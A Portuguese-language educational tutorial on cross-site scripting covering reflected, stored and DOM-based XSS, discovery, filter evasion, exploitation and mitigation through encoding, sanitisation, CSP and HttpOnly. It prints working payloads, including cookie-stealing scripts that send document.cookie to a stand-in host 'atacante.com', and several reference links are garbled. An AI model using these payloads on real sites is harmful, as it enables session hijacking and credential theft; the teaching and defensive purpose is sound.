# Cross-Site Scripting (XSS)

O Cross-Site Scripting (XSS) representa uma das vulnerabilidades de segurança mais comuns em aplicações web, figurando consistentemente em classificações de risco, como o **OWASP Top 10**. Compreender a fundo o funcionamento do XSS é um passo fundamental tanto para sua identificação e exploração durante testes de penetração e CTFs, quanto para o desenvolvimento de aplicações seguras. Esta vulnerabilidade de injeção de código permite que um atacante execute scripts maliciosos no navegador de um usuário, explorando a confiança que o navegador deposita no conteúdo servido por uma aplicação web vulnerável. O impacto de um ataque de XSS bem-sucedido é vasto, variando desde o roubo de sessões e dados sensíveis até a desfiguração de páginas e a propagação de malware, comprometendo a integridade da aplicação e a segurança de seus usuários. A exploração se baseia na manipulação de entradas de usuário que são processadas e exibidas pela aplicação sem a devida validação ou codificação, resultando na renderização de scripts arbitrários como parte legítima do HTML da página.
## Definição e Classificação do XSS

Em sua essência, o Cross-Site Scripting é uma falha que ocorre quando uma aplicação web incorpora dados não confiáveis, provenientes de uma fonte externa, em sua saída sem a devida sanitização. O navegador da vítima, ao processar a página, não consegue distinguir entre o script legítimo da aplicação e o script malicioso injetado, executando ambos com o mesmo nível de privilégio no contexto da política de mesma origem (Same-Origin Policy) do domínio da aplicação. Essa característica permite que o script do atacante realize ações em nome do usuário, acesse cookies de sessão (se não protegidos pelo atributo `HttpOnly`), manipule o Document Object Model (DOM) da página para alterar seu conteúdo ou redirecione o usuário para sites maliciosos. Conforme documentado por referências como a **PortSwigger Web Security Academy** e a **OWASP (Open Web Application Security Project)**, as vulnerabilidades de XSS são tradicionalmente classificadas em três categorias principais, que se distinguem pela forma como o código malicioso é entregue e executado: **Reflected (Refletido)**, **Stored (Armazenado)** e **DOM-based (Baseado no DOM)**.
## Categorias de Exploração de XSS

### Reflected XSS (Não Persistente)

O **Reflected XSS** é a forma mais comum da vulnerabilidade, caracterizada pela injeção de um script que é imediatamente "refletido" pelo servidor de volta para o cliente. Neste cenário, o payload malicioso é tipicamente entregue através de uma requisição HTTP, frequentemente como um parâmetro de URL, e incorporado diretamente na resposta HTML. Para que o ataque seja bem-sucedido, o atacante precisa induzir a vítima a interagir com um vetor de entrega, como clicar em um link maliciosamente construído ou submeter um formulário forjado. Considere uma funcionalidade de busca, acessível via `http://exemplo.com/busca?termo=minha-busca`. Se a aplicação exibe o termo pesquisado na página de resultados sem sanitizá-lo, como no trecho de código PHP `echo $_GET['termo'];`, ela se torna vulnerável. Um atacante pode forjar a URL `http://exemplo.com/busca?termo=<script>alert(document.cookie)</script>`, que, ao ser acessada, executa o script no navegador da vítima. Embora o `alert()` seja uma prova de conceito, a exploração real visaria ao roubo de sessão ou outras ações maliciosas. A natureza não persistente significa que o payload não é armazenado no servidor e exige uma nova interação da vítima para cada execução.

- **Leitura recomendada**: [Reflected XSS by PortSwigger](https://portswigger.net/web-security/cross-site-scripting/reflected)
### Stored XSS (Persistente)

O **Stored XSS**, por sua vez, é considerado significativamente mais perigoso devido à sua natureza persistente. Neste tipo de ataque, o payload malicioso é armazenado permanentemente no servidor da aplicação alvo, como em um banco de dados, arquivo de log ou em um sistema de mensagens. Vetores comuns para este ataque incluem campos de comentários em blogs, nomes de perfil de usuário, mensagens em fóruns ou qualquer outro local onde a entrada do usuário é salva e posteriormente exibida a outros usuários. Imagine um sistema de comentários onde o texto inserido é salvo e renderizado sem tratamento. Um atacante poderia submeter um comentário contendo `<script>fetch('http://atacante.com/coletor?c=' + btoa(document.cookie))</script>`. Este script seria salvo pelo servidor. Subsequentemente, todo usuário que visualizasse a página de comentários receberia o script como parte do conteúdo legítimo, e seu navegador o executaria automaticamente, enviando uma versão codificada em Base64 do cookie de sessão para o servidor do atacante, sem qualquer outra interação necessária por parte da vítima. A capacidade de atacar múltiplos usuários de forma passiva torna o Stored XSS uma ameaça de alto impacto.

- **Leitura recomendada**: [Stored XSS by OWASP](https://www.google.com/search?q=https://owasp.org/www-community/attacks/Stored_XSS_Attacks)
### DOM-based XSS

O **DOM-based XSS** representa uma variante mais sutil, onde a vulnerabilidade reside inteiramente na lógica do código do lado do cliente (client-side). A injeção e a execução do payload ocorrem como resultado da manipulação insegura do ambiente do DOM no navegador da vítima. Crucialmente, o payload malicioso pode nunca ser enviado ao servidor, tornando a detecção por meio de logs do lado do servidor praticamente impossível. A vulnerabilidade surge quando um script legítimo da página utiliza dados controláveis pelo usuário (a **source**, ou fonte, como `location.hash` ou `document.referrer`) para popular uma função ou propriedade insegura (o **sink**, ou destino, como `innerHTML` ou `document.write()`). Por exemplo, o JavaScript `var nome = new URLSearchParams(window.location.search).get('nome'); document.getElementById('saudacao').innerHTML = "Bem-vindo, " + nome;` é vulnerável. Um atacante pode criar o link `http://exemplo.com/pagina?nome=<img src=x onerror=alert('XSS')>`. O script extrai o payload do parâmetro `nome` (a fonte) e o insere diretamente na propriedade `innerHTML` (o sink), fazendo com que o navegador processe o HTML malicioso e execute o código no evento `onerror`.

- **Leitura recomendada**: [DOM-based XSS by PortSwigger](https://portswigger.net/web-security/cross-site-scripting/dom-based)
## Descoberta de Vulnerabilidades XSS

A descoberta de XSS inicia-se com a identificação de todos os vetores de entrada de dados em uma aplicação, pois cada ponto onde o dado fornecido pelo usuário é refletido na página é um candidato potencial. A abordagem combina análises manuais e o uso de ferramentas automatizadas. Na investigação manual, o objetivo é compreender o contexto no qual a entrada é renderizada. Um pentester deve questionar se o dado é refletido dentro de uma tag HTML, de um atributo, de um bloco de script JavaScript ou mesmo em um contexto de CSS. A resposta a essa pergunta determina a estratégia de ataque. Inicialmente, utiliza-se uma string única e não maliciosa (ex: `XYZZY123`) para localizar onde a entrada aparece no código-fonte da página. Uma vez localizado o ponto de reflexão, o próximo passo é tentar escapar do contexto atual para injetar código executável. Por exemplo, se a entrada é refletida no atributo `value="SUA_ENTRADA"`, um payload como `"><script>alert(1)</script>` pode ser eficaz para fechar o atributo e a tag, inserindo um novo elemento de script.

Um aspecto fundamental em cenários de pentest e CTF é a **evasão de filtros**, pois muitas aplicações implementam defesas, como listas negras (blacklists), para bloquear palavras-chave e caracteres perigosos. A criatividade do atacante é essencial neste ponto, envolvendo técnicas como a variação de maiúsculas/minúsculas (`<ScRiPt>`), codificação de caracteres (HTML ou URL), inclusão de caracteres nulos (`<scr%00ipt>`), e, principalmente, o uso de manipuladores de eventos (`onerror`, `onload`, `onmouseover`) em diversas tags HTML (`<img>`, `<iframe>`, `<svg>`), como no clássico `<img src=x onerror=alert(1)>`. Para testes mais robustos e desafios complexos, é comum o uso de **payloads poliglota**, que são strings de código capazes de executar em múltiplos contextos simultaneamente, aumentando a chance de sucesso contra filtros desconhecidos. Profissionais frequentemente consultam vastas coleções de payloads, como a **PortSwigger's XSS cheat sheet** e o repositório **payloadallthethings no GitHub**, que são recursos indispensáveis para contornar diferentes tipos de sanitização.

- **Referências de Payloads**:
    - [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
    - [PayloadAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

Ferramentas de varredura automatizada, como o **Burp Suite Scanner** e o **OWASP ZAP**, podem ser recursos valiosos na fase inicial de reconhecimento. Elas operam enviando uma vasta gama de payloads conhecidos para todos os parâmetros e pontos de entrada detectados, analisando as respostas para identificar reflexões de código que indiquem uma possível vulnerabilidade. Embora acelerem o processo, essas ferramentas podem não descobrir vulnerabilidades mais complexas, que dependem da lógica de negócio da aplicação ou que exigem múltiplos passos para serem exploradas. Além disso, a utilização de ferramentas automatizadas pode gerar muito "barulho", sendo facilmente detectadas pelo alvo. Portanto, a análise manual permanece indispensável para uma avaliação precisa.

- **Ferramentas de Referência**:
    - [Burp Suite by PortSwigger](https://portswigger.net/burp)
    - [OWASP ZAP (Zed Attack Proxy)](https://www.zaproxy.org/)
## Exploração de Vulnerabilidades XSS

Uma vez que uma vulnerabilidade de XSS é confirmada, a fase de exploração visa demonstrar o impacto real da falha, indo além da simples prova de conceito como `alert(1)`. O objetivo final é executar ações maliciosas no contexto da sessão da vítima. A exploração mais clássica é o **roubo de cookies de sessão**, onde o acesso ao `document.cookie` permite ao atacante obter o identificador de sessão da vítima e, consequentemente, sequestrá-la. Um payload típico para essa finalidade, `<script>document.location='http://atacante.com/log?c='+document.cookie;</script>`, envia o cookie para um servidor controlado pelo atacante, que pode então usá-lo para se passar pela vítima.

No entanto, as possibilidades de exploração são muito mais amplas. Um atacante pode injetar um **keylogger** em JavaScript para capturar todas as teclas digitadas pelo usuário, enviando credenciais e outras informações sensíveis. Outra técnica poderosa é a **manipulação da interface (UI Redressing)**, onde o script malicioso altera a página para enganar o usuário, por exemplo, injetando um formulário de login falso para capturar credenciais. É também possível forçar o navegador da vítima a realizar **ações arbitrárias** em seu nome, como alterar a senha, realizar compras ou enviar mensagens, através de scripts que disparam requisições (usando `fetch()` ou `XMLHttpRequest`) para funcionalidades da aplicação. A técnica mais avançada é o **hooking do navegador** com frameworks como o **BeEF (The Browser Exploitation Framework)**. Neste caso, o payload de XSS "engancha" o navegador da vítima, conectando-o a um painel de controle do atacante, que pode então lançar módulos de exploração em tempo real, desde captura de tela e áudio até a exploração de vulnerabilidades do próprio navegador. Em um contexto de pentest ou CTF, a exploração bem-sucedida frequentemente envolve o encadeamento criativo de XSS com outras falhas ou a busca por uma "flag", que pode estar no cookie de um administrador, no código-fonte de uma página restrita ou ser obtida após a execução de uma ação específica.
## Estratégias de Mitigação

A prevenção eficaz do Cross-Site Scripting exige uma abordagem fundamentada no princípio de que toda entrada de usuário deve ser considerada não confiável. A responsabilidade primária recai sobre os desenvolvedores, que devem implementar múltiplas camadas de proteção para neutralizar vetores de ataque. A estratégia mais crítica e eficaz é a **codificação de saída contextual (contextual output encoding)**. Antes de renderizar qualquer dado dinâmico na página, é imperativo codificá-lo de acordo com o contexto específico onde será inserido. Por exemplo, a codificação para dados que aparecerão diretamente no corpo do HTML (onde `<` se torna `&lt;`) é diferente da codificação necessária para dados inseridos em atributos HTML, em blocos de script JavaScript ou em propriedades CSS. A **OWASP XSS Prevention Cheat Sheet** serve como um guia de referência fundamental para a aplicação correta dessas regras de codificação.

Como uma primeira linha de defesa, a **validação de entrada (input validation)** deve ser aplicada. Esta técnica consiste em impor regras estritas sobre os dados que a aplicação aceita, preferencialmente utilizando uma abordagem de lista de permissões (allow-list) que define exatamente os caracteres e formatos permitidos, rejeitando todas as demais entradas. Embora a validação de entrada possa prevenir muitas injeções simples, ela não deve ser a única defesa, pois aplicações complexas frequentemente precisam aceitar uma gama variada de caracteres que podem ser explorados em contextos inesperados. Para cenários que exigem a renderização de HTML rico fornecido pelo usuário, como em editores de texto, a simples codificação não é suficiente. Nesses casos, é essencial o uso de bibliotecas de **sanitização de HTML**, como a **DOMPurify** para JavaScript. Essas bibliotecas analisam o HTML de entrada e removem ativamente todos os elementos e atributos potencialmente maliciosos.

Adicionalmente, a implementação de uma **Política de Segurança de Conteúdo (Content Security Policy - CSP)** atua como uma forte camada de mitigação. A CSP é um cabeçalho de resposta HTTP que permite aos administradores de um site definir e controlar os recursos (scripts, estilos, imagens, etc.) que o navegador está autorizado a carregar. Uma CSP bem configurada, por exemplo com a diretiva `script-src 'self'`, pode impedir a execução de scripts inline e de scripts carregados de domínios não autorizados, mitigando efetivamente o impacto de uma injeção de XSS bem-sucedida, mesmo que uma vulnerabilidade exista no código. Por fim, para mitigar o impacto direto do roubo de sessão, os cookies devem ser protegidos com o atributo `HttpOnly`, que impede que eles sejam acessados por scripts do lado do cliente, tornando-os inúteis para um atacante que tenha conseguido uma execução de script.
## Conclusão

O Cross-Site Scripting permanece como uma das ameaças mais críticas e persistentes na web, explorando a confiança entre o usuário e a aplicação. Como demonstrado, a vulnerabilidade se manifesta em diversas formas (Refletida, Armazenada e Baseada em DOM) cada uma com seus próprios vetores e níveis de impacto. Para o profissional de segurança ofensiva, a descoberta e exploração do XSS exigem uma combinação de reconhecimento, compreensão profunda do contexto de renderização e criatividade para evadir filtros. Para o engenheiro de software, a mitigação do XSS não é uma tarefa opcional, mas uma responsabilidade central no ciclo de vida do desenvolvimento seguro. Uma defesa eficaz não se apoia em uma única solução, mas sim em uma estratégia multicamada que combina a validação rigorosa de todas as entradas, a codificação contextual de todas as saídas, a sanitização de HTML quando necessário e a implementação de políticas de segurança no nível do navegador, como a CSP. Dominar o Cross-Site Scripting é, portanto, um exercício de dualidade. De um lado, exige o raciocínio e criatividade do atacante para desconstruir a lógica da aplicação e identificar pontos de injeção em contextos complexos. Do outro, demanda a disciplina do engenheiro para construir defesas em camadas, onde a falha de um único controle não resulta no comprometimento do sistema.
### Referências

- **OWASP (Open Web Application Security Project)**
    - Top 10: [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
    - Cross-Site Scripting Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
    - Stored XSS Attacks: [https://owasp.org/www-community/attacks/Stored_XSS_Attacks](https://www.google.com/search?q=https://owasp.org/www-community/attacks/Stored_XSS_Attacks)
- **PortSwigger Web Security Academy**
    - Cross-Site Scripting: [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/we%3C3%3Eb-security/cross-site-scripting)
    - Reflected XSS: [https://portswigger.net/web-security/cross-site-scripting/reflected](https://portswigger.net/web-securi%3C4%3Ety/cross-site-scripting/reflected)
    - DOM-based XSS: [https://portswigger.net/web-security/cross-site-scripting/dom-based](https://portswigger.net/web-securi%3C5%3Ety/cross-site-scripting/dom-based)
    - XSS Cheat Sheet: [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- **Ferramentas e Payloads**
    - PayloadAllTheThings (GitHub): [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
    - DOMPurify (GitHub): [https://github.com/cure53/DOMPurify](https://github.com/cure53/DOMPurify)
    - Burp Suite: [https://portswigger.net/burp](https://portswigger.net/burp)
    - OWASP ZAP: [https://www.zaproxy.org/](https://www.zaproxy.org/)
    - BeEF (The Browser Exploitation Framework): [https://beefproject.com/](https://beefproject.com/)